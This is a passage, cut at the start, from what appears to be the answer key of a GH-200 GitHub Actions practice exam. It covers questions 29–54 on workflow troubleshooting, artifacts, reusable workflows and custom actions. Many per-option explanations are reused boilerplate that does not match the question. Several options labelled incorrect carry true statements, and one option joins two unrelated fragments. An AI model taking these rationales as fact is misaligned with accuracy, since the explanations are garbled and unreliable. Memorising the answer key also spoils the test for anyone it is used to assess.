- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 29 — `A, C` (Consume and troubleshoot workflows)

Correct answers: A and C (are correct). Inspect `_diag/Runner_*.log` (`for 45-second heartbeat/TLS proxy drops to *.actions.githubusercontent.com`) and `_diag/Worker_*.log` + OS `dmesg`/`journalctl` (`for Linux OOM-killer exit 137 or disk exhaustion under _work/`). [Skill 2.2: Enable and interpret step and runner diagnostic logs to identify failures | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging)]

- **A:** Correct. Selective failed-job reruns with debug logging capture verbose step and runner diagnostics without re-running passing matrix combinations.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.
- **D:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **E:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **F:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 30 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). When `*rust_defaults` expands to `{ run: { shell: bash, working-directory: crates/core } }`, every `run:` shell step in job 2 (`unless overridden at the step level`) executes inside `crates/core`, while `uses:` action steps ignore `defaults.run`. [Skill 2.3: Interpret workflows that use YAML anchors and aliases during execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. When expanding `<<: *defaults` in a YAML mapping, keys explicitly written in the child mapping take precedence over keys inherited from `*defaults`.
- **D:** Incorrect. Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.

### Question 31 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Yes — single-file YAML anchors (`&shared_env`) and mapping merge keys (`<<: *shared_env`) are natively supported inside one workflow `.yml` file, and local `RUSTFLAGS` overrides the anchored value cleanly in job 2. [Skill 2.3: Interpret workflows that use YAML anchors and aliases during execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations#yaml-anchors-and-aliases)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Correct. Every trigger, context, permission, runner, and security boundary in the proposed solution aligns with official GitHub Actions behavior.
- **C:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **D:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.

### Question 32 — `B` (Consume and troubleshoot workflows)

Correct answer: B (is correct). Re-running a job uses the SAME original commit `GITHUB_SHA` and workflow YAML snapshot from the initial run, while fetching the LATEST current values of `secrets.*` and `vars.*` (`so rotating an expired staging secret and clicking Re-run failed jobs succeeds`). [Skill 2.4: Analyze matrix-driven runs and re-run failed or targeted jobs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Correct. GitHub Actions supports re-running all jobs, **only failed jobs** (and their downstream dependents), or **one specific job** up to 30 days after initial run creation.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.

### Question 33 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). Mapping the failed run-graph job to `(macos-15, python-3.13)`, inspecting step logs for the first non-zero exit / `::error::`, running `Re-run failed jobs` with `Enable debug logging`, and verifying the committed fix resolves the issue cleanly. [Skill 2.4: Analyze matrix-driven runs and re-run failed or targeted jobs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs)]

- **A:** Incorrect. Deleting workflows erases run history, printing secrets violates security rules, and re-running green matrix legs wastes billable minutes.
- **B:** Incorrect. Standard GitHub-hosted runners do not expose inbound port 22 SSH, and permanent org-wide debug logging bloats log storage.
- **C:** Incorrect. Suppressing exit codes with `|| true` hides real regressions rather than diagnosing the failing matrix variant.
- **D:** Correct. Selective `Re-run failed jobs` with `Enable debug logging` (`ACTIONS_STEP_DEBUG` / `ACTIONS_RUNNER_DEBUG`) isolates failures without re-billing green legs.

### Question 34 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). In the Actions tab run filter bar, `branch:main is:failure event:schedule` (`alongside actor:<user>`) filters runs interactively by branch, conclusion status, and trigger event. [Skill 2.5: Locate workflow runs and logs via the GitHub UI, CLI, and REST API | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/workflow-runs)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Correct. Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.

### Question 35 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). Calling `DELETE /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`requiring actions: write`) permanently deletes all stored step/job log archives for that workflow run while preserving the run metadata record. [Skill 2.5: Locate workflow runs and logs via the GitHub UI, CLI, and REST API | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/workflow-runs)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 36 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). Starting in `actions/upload-artifact@v4` (`>= v4.4+`), hidden files/dotfiles are EXCLUDED by default to prevent accidental `.env`/`.git` credential leaks unless `include-hidden-files: true` is explicitly configured. [Skill 2.6: Access and download workflow artifacts from completed runs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts)]

- **A:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Correct. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 37 — `C, E` (Consume and troubleshoot workflows)

Correct answers: C and E (are correct). In `v4`, artifacts are immutable once uploaded (`matrix legs must upload unique names like wheel-${{ matrix.os }}-${{ matrix.py }}`), and `actions/download-artifact@v4` supports glob `pattern: wheel-*` with `merge-multiple: true` (`plus up to 90% faster direct transfers`). [Skill 2.6: Access and download workflow artifacts from completed runs | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts)]

- **A:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Correct. In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **E:** Correct. Because `upload-artifact@v4` artifacts are immutable once uploaded, matrix legs upload distinct artifact names and fan-in jobs merge them via `pattern:`.
- **F:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 38 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). GitHub Actions allows at most `4` levels of nested reusable workflows (`caller -> L1 -> L2 -> L3 -> L4`), so attempting a 5th nested `workflow_call` hop fails validation at workflow startup. [Skill 2.7: Consume organization-level reusable workflows in downstream repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 39 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). No — a called reusable workflow runs in the CALLER repository's security context (`vireobio/aligner-cli`), so secrets and environments resolve against the caller repository (`or shared Organization secrets`), never the callee repository's private repo/environment secrets. [Skill 2.7: Consume organization-level reusable workflows in downstream repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Correct. Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.

### Question 40 — `C` (Consume and troubleshoot workflows)

Correct answer: C (is correct). Organization starter workflow templates must reside in the `workflow-templates/` directory at the root of the `<org>/.github` repository alongside a matching `<name>.properties.json` metadata file. [Skill 2.8: Use public and non-public starter workflow templates across repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.
- **C:** Correct. Starter workflows copy a static `.yml` into a repo once (`edits to the template never propagate`), unlike centrally versioned Reusable workflows or Composite actions.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 41 — `A` (Consume and troubleshoot workflows)

Correct answer: A (is correct). Place `dna-helix.svg` inside `.github/workflow-templates/` alongside `assay-ci.yml` and set `"iconName": "dna-helix"` (`omitting the .svg file extension`) in `assay-ci.properties.json`. [Skill 2.8: Use public and non-public starter workflow templates across repositories | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-workflow-templates)]

- **A:** Correct. Starter workflows copy a static `.yml` into a repo once (`edits to the template never propagate`), unlike centrally versioned Reusable workflows or Composite actions.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **D:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.

### Question 42 — `D` (Consume and troubleshoot workflows)

Correct answer: D (is correct). Re-enabling or confirming scheduled execution in the Actions UI (`Keep this scheduled workflow active` banner / `gh workflow enable ncbi-mirror.yml` or REST `PUT .../workflows/{workflow_id}/enable`) resets the 60-day public-repo inactivity timer without polluting Git history. [Skill 2.9: Manage workflow lifecycle states including disabling, enabling, and deleting workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.

### Question 43 — `D, E` (Consume and troubleshoot workflows)

Correct answers: D and E (are correct). Disabling (`UI / gh workflow disable / PUT .../disable`) stops automated webhook and `schedule` runs immediately while keeping `.github/workflows/audit-export.yml` in Git and retaining past run logs/artifacts; re-enabling (`gh workflow enable`) resumes triggers with zero Git commits. [Skill 2.9: Manage workflow lifecycle states including disabling, enabling, and deleting workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/disabling-and-enabling-a-workflow)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Correct. Disabling halts triggers while preserving run history and source YAML in the repository.
- **E:** Correct. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **F:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 44 — `C` (Author and maintain actions)

Correct answer: C (is correct). Modern JavaScript actions specify `runs: { using: 'node20', main: 'dist/index.js' }` (`with optional pre: and post: scripts`) to run directly on the runner host's embedded Node 20 runtime across Linux, macOS, and Windows. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Correct. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **D:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.

### Question 45 — `A` (Author and maintain actions)

Correct answer: A (is correct). Calling `await tc.cacheDir(extractedPath, 'samtools', '1.21', arch)` (`paired with tc.find('samtools', '1.21', arch)` on cache hits and `core.addPath(cachedPath)`) populates `$RUNNER_TOOL_CACHE` cleanly with `.complete` markers. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Correct. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 46 — `C` (Author and maintain actions)

Correct answer: C (is correct). Authoring `action.yml` (`using: "node20"`, `main: "dist/index.js"`), coding with `@actions/core` & `core.setFailed()`, bundling `dist/index.js` via `@vercel/ncc` & committing `dist/`, and tagging `v1.0.0` + `v1` + 40-char SHA delivers fast cross-OS execution. [Skill 3.1: Create and configure JavaScript actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-javascript-action)]

- **A:** Incorrect. Omitting both `dist/` and `node_modules/` crashes immediately with `Cannot find module`, `node12` is retired, and `@main` is unsafe.
- **B:** Incorrect. Bundled `dist/index.js` + `action.yml` runs standalone with zero pre-install steps in caller workflows.
- **C:** Correct. Bundling `node20` JavaScript actions into committed `dist/index.js` gives sub-second cross-OS execution with zero consumer `npm install` step.
- **D:** Incorrect. Docker actions fail on macOS and Windows runners; cross-OS custom actions require JavaScript (`node20`) or Composite actions.

### Question 47 — `A` (Author and maintain actions)

Correct answer: A (is correct). No — Docker container actions (`runs.using: 'docker'`) execute ONLY on Linux runners with Docker available and fail on `macos-15` and `windows-2025`; use a `node20` JavaScript action or `composite` action instead. [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Correct. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **B:** Incorrect. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.
- **C:** Incorrect. JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.
- **D:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — Docker container actions (`runs.using: 'docker'`) execute ONLY on Linux runners with Docker available and fail on `macos-15` and `windows-2025`; use a `node20` JavaScript action or `composite` action instead.

### Question 48 — `A` (Author and maintain actions)

Correct answer: A (is correct). Workflow validation fails immediately because Composite actions do NOT inherit caller `defaults.run.shell`; EVERY `run:` step inside a `composite` action must explicitly declare `shell:` (`e.g., shell: bash` or `shell: pwsh`). [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Correct. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 49 — `A, F` (Author and maintain actions)

Correct answers: A and F (are correct). Composite actions cannot read `${{ secrets.* }}` implicitly (`pass sensitive values explicitly via declared action inputs: with: api-key: ${{ secrets.KEY }}`), and Composite actions can nest both `run:` steps (`with explicit shell:`) and `uses:` steps inside a single caller job. [Skill 3.2: Create and configure Docker container and composite actions, and select the appropriate action type | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-docker-container-action)]

- **A:** Correct. Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.
- **B:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **E:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **F:** Correct. Composite actions require explicit `shell:` on every `run:` step and locate files inside the action repo via `github.action_path`.

### Question 50 — `D` (Author and maintain actions)

Correct answer: D (is correct). With Immutable Actions, GitHub packages `v1.1.0` at release time as an immutable, digest-addressed OCI artifact in `GHCR` (`pkg.actions.githubusercontent.com` / `ghcr.io`) that cannot be force-pushed or mutated later (`falling back to Git refs only for non-immutable refs`). [Skill 3.3: Troubleshoot action failures and adopt immutable action distribution practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions)]

- **A:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Immutable Actions package releases into immutable OCI artifacts so published versions cannot be silently overwritten, while `core.setFailed()` logs an `::error::` annotation and sets exit code `1`.

### Question 51 — `D` (Author and maintain actions)

Correct answer: D (is correct). Pre-build and push the versioned container image to `ghcr.io` during action release CI and set `runs.image: 'docker://ghcr.io/vireobio/bwa-action@sha256:...'` in `action.yml` so consumer jobs pull prebuilt layers instead of running `docker build` per job. [Skill 3.3: Troubleshoot action failures and adopt immutable action distribution practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions)]

- **A:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Correct. Immutable Actions package releases into immutable OCI artifacts so published versions cannot be silently overwritten, while `core.setFailed()` logs an `::error::` annotation and sets exit code `1`.

### Question 52 — `A` (Author and maintain actions)

Correct answer: A (is correct). `core.getBooleanInput('cache-hit-only')` parses YAML 1.2 boolean literals (`true`/`True`/`TRUE` and `false`/`False`/`FALSE`) and throws a clear `TypeError` on invalid strings (`unlike truthy string checks if (core.getInput(...))` where `'false'` is truthy in JS!). [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.

### Question 53 — `D` (Author and maintain actions)

Correct answer: D (is correct). Docker container actions support `runs.env: { REF_FASTA: ${{ inputs.reference-fasta }} }` plus `runs.pre-entrypoint` and `runs.post-entrypoint` scripts executed inside separate ephemeral invocations of the same container image. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **C:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **D:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.

### Question 54 — `A, C, D` (Author and maintain actions)

Correct answers: A, C, and D (are correct). `action.yml` (`or action.yaml`) must sit at the root of a `Public` single-action repository; `name` must be globally unique across Marketplace (`not matching an existing action, user, or org`); and `description`, `runs` (`e.g., node20` + committed `dist/`), and `branding` (`valid Feather icon + color`) must be valid. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Correct. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Correct. Bundling dependencies into committed `dist/index.js` makes JavaScript actions self-contained and fast across Linux, Windows, and macOS.
- **E:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
